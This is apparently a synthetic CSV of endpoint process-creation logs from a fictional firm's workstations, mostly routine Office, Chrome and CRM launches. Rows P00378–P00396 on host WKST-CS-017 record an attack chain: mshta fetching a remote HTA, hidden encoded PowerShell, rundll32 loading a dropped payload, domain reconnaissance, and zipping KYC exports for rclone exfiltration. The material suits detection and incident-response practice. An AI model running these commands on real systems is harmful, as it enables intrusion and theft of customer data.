P00339,2026-09-11 10:01:26,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d15e432c855cb0f07b718adf5563f786cae82062abd2426a16c967031c941831,signed,ALLOWED,Low
P00340,2026-09-11 10:06:50,WKST-LOAN-018,shilongo,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",1a55b44a4403ec7462564d8f87bf8d9bcb8f33d0794939c7ee360fabfa181ae0,signed,ALLOWED,Low
P00341,2026-09-11 10:10:57,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",073eed99cb919723d9c868855d5fb5fa82604fc1cfa3427984127ac1f1ff5a45,signed,ALLOWED,Low
P00342,2026-09-11 10:37:31,WKST-CS-017,mhaingura,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3f8707bf17e4beb676a8687105c8037db878739b909d9b2bff3c46898dac5d8a,signed,ALLOWED,Low
P00343,2026-09-11 10:46:59,WKST-CMP-009,kndjavera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",230a5f90bf71556c0145a2dd3b1d3c6768184a42430bce89fd3bebfb74fac65c,signed,ALLOWED,Low
P00344,2026-09-11 10:58:21,WKST-CS-011,tkamati,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",6721d67b70f95a997017c8057c4440be63401f3c9a1f929e30d91182296527f0,signed,ALLOWED,Low
P00345,2026-09-11 11:17:58,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",1d71ea313a2d74c6b3c5dbecbad2bbaef2c347031d7824dcbcf9710018a14bd8,signed,ALLOWED,Low
P00346,2026-09-11 11:31:16,WKST-TRY-007,hamukwaya,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f615cbb4e16861673ae9f5194600bf107c5c3d4cfde937868cc01914735885da,signed,ALLOWED,Low
P00347,2026-09-11 11:32:19,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",bccf5c76715b916bacfa3175e86be7eca6aa5ef83ff927b30e462df2804d3bb9,signed,ALLOWED,Low
P00348,2026-09-11 11:42:46,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,8fe2b86ca9b028b26895715479f47d0ecc1e8f4be4a38e1f3a75a0549115c3dd,signed,ALLOWED,Low
P00349,2026-09-11 11:45:45,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",427df85b707f74aa4e9609eda6a4ef0e2a57e10d3136202016daf7321ba99033,signed,ALLOWED,Low
P00350,2026-09-11 11:49:40,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",68c03b8a52567d9c3eef8a532de64773aa5005cd640142edda7d7aba3a1f2659,signed,ALLOWED,Low
P00351,2026-09-11 11:59:09,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",bb9f38a965e50e36759b249955e887932a6a132e4e8c45951e74666756cbdeee,signed,ALLOWED,Low
P00352,2026-09-11 12:03:26,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c3fbd8b349af87c0a4e9bae1675b7b9b30e7c8362808d07fd0345f0b4c4b4ab0,signed,ALLOWED,Low
P00353,2026-09-11 12:06:14,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b7902709b0c63ea4609fd9511ea6d75986cbd96ae09047224603f069f97c3ba1,signed,ALLOWED,Low
P00354,2026-09-11 12:19:11,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",869c4847582794588bd8a33ce630181c661ad6db0a79e13625dd18f7aa21abe2,signed,ALLOWED,Low
P00355,2026-09-11 12:22:01,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c075e024d9729a2bb7ba636d509ccb7539c7333550d2b5aa29f6438ec488f4af,signed,ALLOWED,Low
P00356,2026-09-11 12:48:57,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",67cc0965f6161979d1ccc1867b91284a2bdd29c0d9bf0d5add4f88d1d7d6d674,signed,ALLOWED,Low
P00357,2026-09-11 12:52:48,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,cf2cba6e7b734e5854a67964c94e33179476348a2c813a348d9e6e004742d9a6,signed,ALLOWED,Low
P00358,2026-09-11 12:53:45,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3877356a55148864a73bc3dd2e044513916fea7dd9d25fd80feeffc3bda2896f,signed,ALLOWED,Low
P00359,2026-09-11 13:24:45,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f94c09ceb94c1d3945f6a0721f945781894b68f1fdb8c0631a034326214950f9,signed,ALLOWED,Low
P00360,2026-09-11 13:30:57,WKST-LOAN-018,shilongo,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",fe68b58ea827333e2a32d030d6999d25bf6d919704549b990cb100dc1e35942a,signed,ALLOWED,Low
P00361,2026-09-11 13:41:55,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",84fd9811dc3c531e34a882e2595814d32f7a740050e25a850d8140e30f57fe12,signed,ALLOWED,Low
P00362,2026-09-11 13:48:01,WKST-IT-012,katjiuongua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,12c0db4583924b5c8d73c173287fe485896606a05eb92158342936e777f8fc93,signed,ALLOWED,Low
P00363,2026-09-11 14:25:34,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",b56b2fc035ae84870bf9bce5401e5e2a80b8b6b87a91ad7d130afd38b12cd520,signed,ALLOWED,Low
P00364,2026-09-11 14:31:21,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",00acccffed7fe07866357a88f1eff6ce0f820ab62b430ba744435b890a63ba07,signed,ALLOWED,Low
P00365,2026-09-11 14:40:11,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",5508956c1bd013ff1f8191ec823d4716ef62c680653dafdc99cf706ca075f06d,signed,ALLOWED,Low
P00366,2026-09-11 14:43:00,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",338dc0a01099a41ee6dec882d261ebd689b21af7f52a89a91408b5a7ced5f72e,signed,ALLOWED,Low
P00367,2026-09-11 14:48:59,WKST-FIN-004,tshivute,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",1ca612cf26ec940b2ef02e3fba4f0bf0cc465ab3b39afb39ee6977f080e47f0c,signed,ALLOWED,Low
P00368,2026-09-11 15:06:23,WKST-OND-004,ndjaba,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f5ce8b26b5e62397770d0271dc26ec12b6f7f9e4edc265504086b4f8cdb918ec,signed,ALLOWED,Low
P00369,2026-09-11 15:13:10,WKST-CMP-009,kndjavera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",715103b67977b474958c16d03dc7dd0c9a39991946ed096aed70182117acb529,signed,ALLOWED,Low
P00370,2026-09-11 15:18:14,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6c4a270e7b59293adf0f5ead5bd53ff6a16d99a7cabf8c60f805d40f5935ecc0,signed,ALLOWED,Low
P00371,2026-09-11 15:25:10,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a302ec2425d7118b551809ef8f85c4448daab4abfe9eef50243505f6495c612b,signed,ALLOWED,Low
P00372,2026-09-11 15:35:04,WKST-IT-012,katjiuongua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6a89fe1d13cce5cd995f6c95b077e9df1d6d9dea05d984ef9992db2b281b8609,signed,ALLOWED,Low
P00373,2026-09-11 15:38:01,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",90d12b1c4df32dd4e626b297cef1622726b2ea3fe01f9e1cd4689b113aae5419,signed,ALLOWED,Low
P00374,2026-09-11 15:47:13,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",be6a51cbdb76d05c344c0762583add370f8bd9c557a9a619455e0bba0c4c9988,signed,ALLOWED,Low
P00375,2026-09-11 16:53:34,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,02b4d4ea72f55b3d7ebd09217cd844b6e0c0787e99e6002521d7d8cacd457849,signed,ALLOWED,Low
P00376,2026-09-11 16:55:01,WKST-PRC-008,sankwasa,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",583e24e3c6f1be4516ba1b701f2d08459029092cdfbc41ed44c5bbbcc9eb88e7,signed,ALLOWED,Low
P00377,2026-09-11 17:01:19,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",0d2b1360bbfc56f7c0b08dd31077d5841f8c459ab4ddf5b525574c3304be4fed,signed,ALLOWED,Low
P00378,2026-09-11 17:02:07,WKST-CS-017,mhaingura,outlook.exe,chrome.exe,chrome.exe https://ofservices-portal.com/benefits-review,9390ef32addf32bfdea786bc1e20679592498068bcbfcd357ea10ab64ea35e47,signed,ALLOWED,Medium
P00379,2026-09-11 17:03:19,WKST-CS-017,mhaingura,chrome.exe,mshta.exe,mshta.exe https://ofservices-portal.com/assets/update.hta,37ed5aea92bb7c32618ef6810a3967d36006f6ef420621cea199c2edd479edda,unsigned,ALLOWED,High
P00380,2026-09-11 17:03:44,WKST-CS-017,mhaingura,mshta.exe,powershell.exe,powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA,37ed5aea92bb7c32618ef6810a3967d36006f6ef420621cea199c2edd479edda,unsigned,ALLOWED,Critical
P00381,2026-09-11 17:04:12,WKST-CS-017,mhaingura,powershell.exe,rundll32.exe,"rundll32.exe C:\Users\Public\wupdate.dat,Start",37ed5aea92bb7c32618ef6810a3967d36006f6ef420621cea199c2edd479edda,unsigned,ALLOWED,Critical
P00382,2026-09-11 17:05:45,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",96284767bea27060e539fd156ffbeb6f9eef80832cdd4cb65b335a6a26bc09e1,signed,ALLOWED,Low
P00383,2026-09-11 17:24:43,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",7690cd593eff8b0d6b3659b59eedb248898764dd7c146aa54fc4e370e88de243,signed,ALLOWED,Low
P00384,2026-09-11 17:30:46,WKST-HR-014,mukwambi,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f84de0854f1dfb1514ff4bfc887593eafbb97b3c51c8ca53069a43447f824987,signed,ALLOWED,Low
P00385,2026-09-11 18:05:54,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e0aeecbb5505979c1763a5a03fc14a80127506d9c2b00b802cd8d63580a6c78b,signed,ALLOWED,Low
P00386,2026-09-11 18:10:39,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",1cd2ff066ab56d820accbb2f756176ad29b03c6199c2fe322597634b88e6511a,signed,ALLOWED,Low
P00387,2026-09-11 18:10:59,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d97b6f7d76d63670ad1c1afa74a89c770699d74cd2a86d355a9226be2f3cecde,signed,ALLOWED,Low
P00388,2026-09-11 18:25:33,WKST-CS-017,mhaingura,powershell.exe,net.exe,"net.exe group ""Domain Admins"" /domain",a08a0fcbdeafd3c1b3a4b495b9a9c9d96850f08946b52bc0622347d3b6e73b78,signed,ALLOWED,High
P00389,2026-09-11 18:26:09,WKST-CS-017,mhaingura,powershell.exe,nltest.exe,nltest.exe /dclist:ofs.local,aa88b9a477164a994d1a75ae07a88fe49298afb96f2216307ef32219e35271d8,signed,ALLOWED,High
P00390,2026-09-11 18:29:02,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2dc5363c032ab95307383cbd0e34395f69e31d27ecc8663c5245285872849b98,signed,ALLOWED,Low
P00391,2026-09-11 18:38:24,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2b27f1d6ed751c6894adbe521f2a68bcfc14c040531f0357fe196d792d11c359,signed,ALLOWED,Low
P00392,2026-09-11 18:42:28,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",4a9c7444ff90327821d1cc1e2784eec140bbc220cf5553af0edadaeacfa0b5a6,signed,ALLOWED,Low
P00393,2026-09-11 18:48:22,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,890e0f220700bd9e8829befe3f9519240296d64745fd739270349a6069d4936e,signed,ALLOWED,Low
P00394,2026-09-11 19:51:52,WKST-SOC-003,haufiku,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,815d4eb6bce4713bf2e4d15626c2167755dcfcb06154c840160074ae26a43934,signed,ALLOWED,Low
P00395,2026-09-12 00:26:16,WKST-CS-017,mhaingura,powershell.exe,7z.exe,7z.exe a -tzip C:\Users\Public\kyc_q3.zip \FS-KYC-01\Exports\2026-Q3\*,98fa304eb3568381f00496a72c88f03254035e878aa5bcb6129534dce482e03d,signed,ALLOWED,Critical
P00396,2026-09-12 00:35:44,WKST-CS-017,mhaingura,powershell.exe,rclone.exe,rclone.exe copy C:\Users\Public\kyc_q3.zip remote:ofs-sync --transfers 4,d20d4b5e7f2ab15d675ecaa9df391bc6d8a43d352ffb9fd0916c1a3e5fce8361,unsigned,ALLOWED,Critical
P00397,2026-09-12 06:02:02,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ddafa929f54ee4406b8e1ee59e7447770aca6ebabc6ad68ceb927ef22a5d4eea,signed,ALLOWED,Low
P00398,2026-09-12 06:25:04,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c02bded06debc2c043ab16031e09ff8d1f58e1c51afd0560b2c6a2d956a2e293,signed,ALLOWED,Low
P00399,2026-09-12 06:50:50,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",7d8241a5e042d6ce6bbf9c717b0a51b005168830c4d93423d40eb6f205d59957,signed,ALLOWED,Low
P00400,2026-09-12 07:07:17,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e87d5b78aae8074e83a439d75a562fcbabb1698128ec8b26ff8d6b5ba1ce12b3,signed,ALLOWED,Low
P00401,2026-09-12 07:11:09,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",39d0f9b35cb797603db3939022961b0baab1cc02a6e141e2f41cc0bf8cae4ac8,signed,ALLOWED,Low
P00402,2026-09-12 07:14:56,WKST-CS-006,nnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",fdc4c81218f606300c0df9468c11ad44460c16296c763fa15e61a9a4231c23a3,signed,ALLOWED,Low
P00403,2026-09-12 07:32:18,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",bc4f73bac60d620ce3e6cbd48101bf7ba0a7181de6995f8020edd582655f5477,signed,ALLOWED,Low
P00404,2026-09-12 07:38:24,WKST-CS-006,nnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",bac9f11eb68f5d31a00e53f641dcec0e214a3e18e1245e4cd1ec50cf02c8dfcc,signed,ALLOWED,Low
P00405,2026-09-12 07:40:19,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,65079f8ac79a3b3b8e0e0ac01a131605a53b8602c1910b790d408589ddf18750,signed,ALLOWED,Low
P00406,2026-09-12 07:57:33,WKST-MKT-010,ntinda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4ae801f90d569bdaec38124063d7f7d22292292e3a4138eca25d0c4232d3d45f,signed,ALLOWED,Low
P00407,2026-09-12 08:16:10,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d57510482607412c903d52b0f500de332d154bd00cea07f8466a15e055fd5d61,signed,ALLOWED,Low
P00408,2026-09-12 08:17:52,WKST-CMP-009,kndjavera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",01cf4f5455930010e7a7c269ce5dfc7741835abb160006b5b395de696b4cac17,signed,ALLOWED,Low
P00409,2026-09-12 08:32:19,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",19f823608ba753462d029004beb64a65a2f6cd93d673a974705b67e09b9db7e2,signed,ALLOWED,Low
P00410,2026-09-12 08:35:48,WKST-CMP-009,kndjavera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",9df86e228e4462a863740856e64b4a2be8ee19888137b6542155944be12a068a,signed,ALLOWED,Low
P00411,2026-09-12 09:00:07,WKST-PRC-008,sankwasa,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4d61954f1aa7eff91d8d87cbb95085acd924fcb90e3030771517c8697334a649,signed,ALLOWED,Low
P00412,2026-09-12 09:02:30,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,d17b167f96bc02fdfa6386788238848df3f3de6af6086136795e0552446d44c4,signed,ALLOWED,Low
P00413,2026-09-12 09:05:45,WKST-LGL-005,mbandeka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",3f0b5b6f4ddf7adedc79550c8fa5a7176bcbd16b10cabf707de8a3c8d781264a,signed,ALLOWED,Low
P00414,2026-09-12 09:32:15,WKST-SWK-008,sihuhua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,4c1943f5aa84e844ff265989b9fa643e4c10b396fb17fd5da615691038fd6804,signed,ALLOWED,Low
P00415,2026-09-12 09:34:08,WKST-TRY-007,hamukwaya,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",4dbe739745c72b17b829765389bde6ac625e0b00d0f456177d064f0046d5c092,signed,ALLOWED,Low
P00416,2026-09-12 09:35:31,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2f063c460e8d043519e5a5f9aa9e301fc074a81b9d1b2685e4dafea250eddf59,signed,ALLOWED,Low
P00417,2026-09-12 09:41:32,WKST-TRY-007,hamukwaya,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",945b0850b4b5ce28f532c1e3192f254436bd66a0ab93fe3c796da21f82c51054,signed,ALLOWED,Low
P00418,2026-09-12 09:43:08,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f3a8f9feeffd9281efd34c643ac8c6f2f4ce230cf416b90b8bc01105175439ad,signed,ALLOWED,Low
P00419,2026-09-12 09:48:13,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",45e4c6375d76f4e77aa6df653f8e4a2a4ad67264fe92afeecbde2ba8ec7db96c,signed,ALLOWED,Low
P00420,2026-09-12 10:03:12,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",abc73646e61e2da4e2e1943efa4d33648cddf42b4ab5e1a91028fabf8ec2c5db,signed,ALLOWED,Low
P00421,2026-09-12 10:07:44,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c532a26cbeb9fa03e96d3a37570f2c577e894385cd4b9686283744f94d2500f6,signed,ALLOWED,Low
P00422,2026-09-12 10:48:13,WKST-FIN-004,tshivute,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",0aa060e0908e2cc285e8a817c4f35b00d6913525b2632f901c56e0daf8cc4f79,signed,ALLOWED,Low
P00423,2026-09-12 10:52:35,WKST-CS-006,nnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",9ac8cb344efc2eea4ca2bd93c9a00895e9b2189906c2107590d76c6aa533677e,signed,ALLOWED,Low
P00424,2026-09-12 10:59:54,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c9ff272cd6c7b543ffd732de950cfd2ba195d5c1019f7a8cd631fb73e03e636f,signed,ALLOWED,Low
P00425,2026-09-12 11:17:37,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",d730c760623e1d95771413364df35c7d57cd4601e178e22bbddbcf93a6e45a96,signed,ALLOWED,Low
P00426,2026-09-12 11:26:54,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",fe7bbeb1222a21fc9344538c6113dad39457ed6b73bbe042f43ad2338cecbb57,signed,ALLOWED,Low
P00427,2026-09-12 11:35:02,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",78fed2a973b3e72e82152be0841903f84f4eda1109bd75cedf1103d16fb148f5,signed,ALLOWED,Low
P00428,2026-09-12 11:50:27,WKST-SOC-003,haufiku,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,889f47ce388e06b389c2b7890bc0a3f6c8f1c0383f92867431ddf34835b9c89e,signed,ALLOWED,Low
P00429,2026-09-12 11:58:55,WKST-CMP-009,kndjavera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",72663b32bfb17d3e0a4b8b14253b0e224500abd70f348b1d0a532ee2588fece5,signed,ALLOWED,Low
P00430,2026-09-12 12:00:10,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",07cdf37e067f8f8405df259245de59f706a0e3e21842dc71fa2da8ba41b8d30a,signed,ALLOWED,Low
P00431,2026-09-12 12:02:06,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",674c1e25dd36eeb016b087d1390b6e16a7ec2f1306f2fe1a7d558586ef4448d3,signed,ALLOWED,Low
P00432,2026-09-12 12:17:17,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",0b729154ab8d6756583a4c6e7c449f928db0a3683ccd245a855667a5fea0803d,signed,ALLOWED,Low
P00433,2026-09-12 12:18:58,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,688155792a21f1c63cbf1c82ef07421daf4df0cd36fa26532a9e929c79abc8d5,signed,ALLOWED,Low
P00434,2026-09-12 12:22:15,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",3a3e7b6a8d19a93eb194abb4c5b16f9dee36828fc195e6a00ac5600784efa94c,signed,ALLOWED,Low
P00435,2026-09-12 12:40:21,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d617ad8127eb1e2752c834623ba89ff747273502940fcd5eefc23a00d2bfb5a9,signed,ALLOWED,Low
P00436,2026-09-12 12:40:35,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ce0a038eb8fa9f444db1691ddc58c80a77a60a537f605f3c775ac3461f103f01,signed,ALLOWED,Low
P00437,2026-09-12 12:46:05,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",0db237a1cdae31183c74e657439244eb35218e11b0c57d6b21986b342b37ba00,signed,ALLOWED,Low
P00438,2026-09-12 13:48:05,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6d4e076154dd826191bfc91f65f65728956de412b47ca3171440490f6f844474,signed,ALLOWED,Low
P00439,2026-09-12 13:51:24,WKST-CS-017,mhaingura,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",1d6efa3347672b833d9e8652a772a05b107b786f439a16176c43760b9a84b78d,signed,ALLOWED,Low
P00440,2026-09-12 14:17:53,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6ef158bd6f6447d21f5dd50c46e0d3e320672cf3039870636e172a8ccc241bda,signed,ALLOWED,Low
P00441,2026-09-12 14:22:09,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7f831a0c27db4b959cbbf7063f3d30e9df2733cd113bca13019db9ca57881d0f,signed,ALLOWED,Low
P00442,2026-09-12 14:38:26,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d3f35142941cf0f5ba80abd405431b7520d89b79afa0097dea620da84d257f1f,signed,ALLOWED,Low
P00443,2026-09-12 14:43:15,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",301f0f5434521793f0453feb0b27ab70597fa0ef6cbdf0e76d098c56169717bd,signed,ALLOWED,Low
P00444,2026-09-12 14:47:02,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",0094819eb93e1b32f282f0e4e5a22c7fb1a96832bc18159bf2f844a5686f98f4,signed,ALLOWED,Low
P00445,2026-09-12 14:47:31,WKST-EXE-002,shapaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",5deb1d040972984382a045121d94042c46df0425c4856d69126cc6b35518362a,signed,ALLOWED,Low
P00446,2026-09-12 14:57:22,WKST-LGL-005,mbandeka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,fdc791ec4337662c048f423fb57bbd554d8163fe196afcc24161374c15a47579,signed,ALLOWED,Low
P00447,2026-09-12 15:08:44,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",8ef2d0bac406535d84e8ad77c5225d423115bfc6c21ebe5584837163423dd4c9,signed,ALLOWED,Low
P00448,2026-09-12 15:20:22,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",304db29fa7e5fa7b91775ef0f2d477fb7443dca93512626b2e92e59119fbdf9e,signed,ALLOWED,Low
P00449,2026-09-12 15:46:12,WKST-CS-017,mhaingura,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2c0541432fe21c8c07cee885c78ce2f9c1912aea04b01a0179465b6c016360e5,signed,ALLOWED,Low
P00450,2026-09-12 15:55:02,WKST-CMP-009,kndjavera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",71b4158c47a2bd9a5c1e2568c3734a03e437eb0096aaa9beb4e7d59067ed8be3,signed,ALLOWED,Low
